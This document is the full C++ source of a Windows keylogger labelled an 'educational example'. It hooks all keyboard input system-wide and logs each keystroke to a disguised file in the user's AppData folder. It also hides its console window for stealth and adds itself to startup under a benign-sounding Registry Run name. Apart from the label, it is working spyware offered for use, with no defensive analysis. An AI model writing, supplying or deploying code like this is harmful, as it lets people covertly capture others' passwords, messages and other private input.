### Keylogger C++ Code (Educational Example)

This example includes:
1.  **Low-level keyboard hook (`WH_KEYBOARD_LL`)**
2.  **Callback function (`LowLevelKeyboardProc`)**
3.  **Key code to character translation**
4.  **Logging to `%APPDATA%`**
5.  **Basic persistence (Registry Run key)**
6.  **Hiding the console window**

```cpp
#include <windows.h>      // Required for Windows API functions
#include <iostream>       // For console output (debugging)
#include <fstream>        // For file operations (logging)
#include <string>         // For string manipulation
#include <shlobj.h>       // For SHGetFolderPath (to get APPDATA path)
#include <Lmcons.h>       // For UNLEN (max username length, for log file naming)

// Global variables
HHOOK _hook;                       // Handle to the keyboard hook
std::ofstream logFile;             // Output file stream for logging
std::string logFilePath;           // Stores the full path to the log file

// --- Function Prototypes ---
// The callback function for the keyboard hook
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);

// Sets up the keyboard hook
void SetHook();

// Removes the keyboard hook
void UnHook();

// Logs a captured keystroke to the file
void LogKeystroke(DWORD vkCode);

// Gets the path to the APPDATA folder and constructs the log file path
std::string GetLogFilePath();

// Adds the application to run at startup via the Registry
bool AddToStartup();

// --- Main Function ---
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // 1. Hide the console window for stealth
    // GetConsoleWindow() returns the handle to the console window
    // ShowWindow() hides it (SW_HIDE)
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    // 2. Add to startup for persistence
    if (AddToStartup()) {
        // std::cout << "Added to startup successfully." << std::endl; // Debug
    } else {
        // std::cerr << "Failed to add to startup or already exists." << std::endl; // Debug
    }

    // 3. Get the log file path
    logFilePath = GetLogFilePath();
    if (logFilePath.empty()) {
        // std::cerr << "Failed to determine log file path. Exiting." << std::endl; // Debug
        return 1;
    }

    // 4. Set up the keyboard hook
    SetHook();
    // std::cout << "Keyboard hook set. Logging to: " << logFilePath << std::endl; // Debug

    // 5. Message loop to keep the hook active
    // The thread that called SetWindowsHookEx must continue to process messages
    // otherwise the hook will be removed.
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // 6. Unhook the keyboard (this part is usually unreachable in a persistent keylogger)
    UnHook();
    // std::cout << "Keyboard hook removed." << std::endl; // Debug

    return 0;
}

// --- Function Implementations ---

// Callback function for the low-level keyboard hook
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    // We only care about key presses (WM_KEYDOWN) and if the hook code is valid (HC_ACTION)
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
        // lParam points to a KBDLLHOOKSTRUCT structure
        KBDLLHOOKSTRUCT* pKBDLLHOOKSTRUCT = (KBDLLHOOKSTRUCT*)lParam;
        LogKeystroke(pKBDLLHOOKSTRUCT->vkCode);
    }

    // Pass the event to the next hook in the chain. Essential!
    return CallNextHookEx(_hook, nCode, wParam, lParam);
}

// Sets up the low-level keyboard hook
void SetHook() {
    // WH_KEYBOARD_LL: Specifies a low-level keyboard hook
    // LowLevelKeyboardProc: The callback function
    // GetModuleHandle(NULL): Handle to the current process (exe)
    // 0: Specifies the hook procedure is associated with all existing threads on the desktop
    _hook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);
    if (_hook == NULL) {
        // std::cerr << "Failed to install hook. Error: " << GetLastError() << std::endl; // Debug
    }
}

// Removes the keyboard hook
void UnHook() {
    UnhookWindowsHookEx(_hook);
}

// Logs a captured keystroke to the file
void LogKeystroke(DWORD vkCode) {
    // Open the log file in append mode. This ensures it's opened and closed periodically.
    logFile.open(logFilePath, std::ios_base::app);
    if (!logFile.is_open()) {
        // std::cerr << "Failed to open log file: " << logFilePath << std::endl; // Debug
        return;
    }

    // Get the current keyboard state to handle shift, caps lock, etc.
    BYTE keyboardState[256];
    GetKeyboardState(keyboardState);

    // Get the scan code for the virtual key
    UINT scanCode = MapVirtualKey(vkCode, MAPVK_VK_TO_VSC);

    // Buffer to store the translated character
    char charBuffer[2]; // Enough for one ANSI character and null terminator

    // Translate the virtual key code to an ASCII character
    // Using ToAscii for simplicity. ToUnicode for full Unicode support.
    int result = ToAscii(vkCode, scanCode, keyboardState, (LPWORD)charBuffer, 0);

    if (result == 1) { // A single character was translated
        logFile << charBuffer[0];
    } else {
        // Handle special keys for better readability in the log
        switch (vkCode) {
            case VK_SPACE:      logFile << " "; break;
            case VK_RETURN:     logFile << "[ENTER]\n"; break;
            case VK_SHIFT:      logFile << "[SHIFT]"; break; // Logs when key is pressed, not released
            case VK_LSHIFT:     logFile << "[LSHIFT]"; break;
            case VK_RSHIFT:     logFile << "[RSHIFT]"; break;
            case VK_CONTROL:    logFile << "[CTRL]"; break;
            case VK_LCONTROL:   logFile << "[LCTRL]"; break;
            case VK_RCONTROL:   logFile << "[RCTRL]"; break;
            case VK_MENU:       logFile << "[ALT]"; break; // ALT key
            case VK_LMENU:      logFile << "[LALT]"; break;
            case VK_RMENU:      logFile << "[RALT]"; break;
            case VK_BACK:       logFile << "[BACKSPACE]"; break;
            case VK_TAB:        logFile << "[TAB]"; break;
            case VK_CAPITAL:    logFile << "[CAPS_LOCK]"; break;
            case VK_ESCAPE:     logFile << "[ESC]"; break;
            case VK_LEFT:       logFile << "[LEFT_ARROW]"; break;
            case VK_RIGHT:      logFile << "[RIGHT_ARROW]"; break;
            case VK_UP:         logFile << "[UP_ARROW]"; break;
            case VK_DOWN:       logFile << "[DOWN_ARROW]"; break;
            case VK_DELETE:     logFile << "[DEL]"; break;
            case VK_HOME:       logFile << "[HOME]"; break;
            case VK_END:        logFile << "[END]"; break;
            case VK_PRIOR:      logFile << "[PAGE_UP]"; break;
            case VK_NEXT:       logFile << "[PAGE_DOWN]"; break;
            case VK_INSERT:     logFile << "[INSERT]"; break;
            case VK_NUMLOCK:    logFile << "[NUM_LOCK]"; break;
            case VK_MULTIPLY:   logFile << "[NUM_*]"; break;
            case VK_ADD:        logFile << "[NUM_+]"; break;
            case VK_SUBTRACT:   logFile << "[NUM_-]"; break;
            case VK_DECIMAL:    logFile << "[NUM_.]"; break;
            case VK_DIVIDE:     logFile << "[NUM_/]"; break;
            // Function keys
            case VK_F1:         logFile << "[F1]"; break;
            case VK_F2:         logFile << "[F2]"; break;
            case VK_F3:         logFile << "[F3]"; break;
            case VK_F4:         logFile << "[F4]"; break;
            case VK_F5:         logFile << "[F5]"; break;
            case VK_F6:         logFile << "[F6]"; break;
            case VK_F7:         logFile << "[F7]"; break;
            case VK_F8:         logFile << "[F8]"; break;
            case VK_F9:         logFile << "[F9]"; break;
            case VK_F10:        logFile << "[F10]"; break;
            case VK_F11:        logFile << "[F11]"; break;
            case VK_F12:        logFile << "[F12]"; break;
            default:            logFile << "[VK_" << vkCode << "]"; break; // Log unknown keys by their virtual code
        }
    }

    // Close the file to avoid data loss and implement "periodic closing"
    logFile.close();
}

// Gets the path to the APPDATA folder and constructs the log file path
std::string GetLogFilePath() {
    char appDataPath[MAX_PATH];
    if (SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, 0, appDataPath) == S_OK) {
        std::string path = appDataPath;
        path += "\\Microsoft\\SystemLogs\\sec_log.txt"; // A discreet path and name
        return path;
    }
    return ""; // Return empty string on failure
}

// Adds the application to run at startup via the Registry
bool AddToStartup() {
    HKEY hKey;
    LONG result;

    // Open the Run key for the current user
    result = RegOpenKeyEx(HKEY_CURRENT_USER,
                          "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                          0,
                          KEY_SET_VALUE,
                          &hKey);

    if (result != ERROR_SUCCESS) {
        // std::cerr << "Error opening registry key: " << result << std::endl; // Debug
        return false;
    }

    // Get the path of the current executable
    char currentExePath[MAX_PATH];
    GetModuleFileName(NULL, currentExePath, MAX_PATH);

    // Set the registry value (e.g., "MyStealthApp" = "C:\path\to\mykeylogger.exe")
    result = RegSetValueEx(hKey,
                           "SystemMonitorService", // A benign-sounding name
                           0,
                           REG_SZ,
                           (const BYTE*)currentExePath,
                           strlen(currentExePath) + 1); // +1 for null terminator

    RegCloseKey(hKey);

    if (result != ERROR_SUCCESS) {
        // std::cerr << "Error setting registry value: " << result << std::endl; // Debug
        return false;
    }

    return true;
}

```

